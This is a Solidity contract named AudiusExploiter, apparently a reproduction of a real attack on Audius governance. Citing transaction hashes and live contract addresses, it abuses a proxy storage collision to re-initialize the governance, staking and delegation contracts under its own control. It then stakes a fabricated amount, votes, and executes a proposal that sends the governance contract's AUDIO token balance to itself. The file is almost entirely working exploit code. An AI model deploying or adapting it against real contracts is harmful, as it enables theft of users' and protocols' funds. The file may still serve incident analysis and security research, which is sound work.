// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./interfaces/AudiusInterfaces.sol";

// Tx hashes:
// 0xfefd829e246002a8fd061eede7501bccb6e244a9aacea0ebceaecef5d877a984
// 0x3c09c6306b67737227edc24c663462d870e7c2bf39e9ab66877a980c900dd5d5
// 0x4227bca8ed4b8915c7eec0e14ad3748a88c4371d4176e716e8007249b9980dc9
contract AudiusExploiter {
    IGovernance private constant AUDIUS_GOVERNANCE = IGovernance(0x4DEcA517D6817B6510798b7328F2314d3003AbAC);
    IStaking private constant AUDIUS_STAKING = IStaking(0xe6D97B2099F142513be7A2a068bE040656Ae4591);
    IDelegateManager private constant AUDIUS_DELEGATE = IDelegateManager(0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225);

    IERC20Like private constant AUDIO = IERC20Like(0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998);

    function propose() external {
        /*
            Storage collision with AudiusAdminUpgradeabilityProxy's proxyAdmin variable and Initializable's initialized
            + initializing variable (inherited in implementation contracts), both at storage slot 0. Admin address is
            0x4DEcA517D6817B6510798b7328F2314d3003AbAC, so lower 2 bytes overlaps both boolean variables to True. This
            means initializer modifier can be passed by anyone.
        */

        // Set self as registry
        AUDIUS_GOVERNANCE.initialize(address(this), 2, 0, 1, 1, address(this));

        // Clear all in progress and evaluatable proposals
        AUDIUS_GOVERNANCE.evaluateProposalOutcome(82);
        AUDIUS_GOVERNANCE.evaluateProposalOutcome(83);

        uint256 balance = AUDIO.balanceOf(address(AUDIUS_GOVERNANCE));

        // Submit malicious proposal. Will make callback to self's getContract in order to get target to call.
        AUDIUS_GOVERNANCE.submitProposal(
            hex"abcd",
            0,
            "transfer(address,uint256)",
            abi.encode(
                address(this),
                balance
            ),
            "AAAA",
            "BBBB"
        );

        // Set to self so that callbacks can be bypassed and can stake any amount we want.
        AUDIUS_STAKING.initialize(address(this), address(this));
        AUDIUS_DELEGATE.initialize(address(this), address(this), 1);
        AUDIUS_DELEGATE.setServiceProviderFactoryAddress(address(this));
        AUDIUS_DELEGATE.delegateStake(address(this), 10_000_000_000_000e18);
    }

    function vote() external {
        AUDIUS_GOVERNANCE.submitVote(84, IGovernance.Vote.Yes);
    }

    function exploit() external {
        AUDIUS_GOVERNANCE.evaluateProposalOutcome(84);
    }

    function getContract(bytes32) external pure returns (address) {
        return address(AUDIO);
    }

    function isGovernanceAddress() external pure returns (bool) {
        return true;
    }

    function getExecutionDelay() external pure returns (uint256) {
        return 0;
    }

    function getVotingPeriod() external pure returns (uint256) {
        return 0;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function validateAccountStakeBalance(address) external{}
}
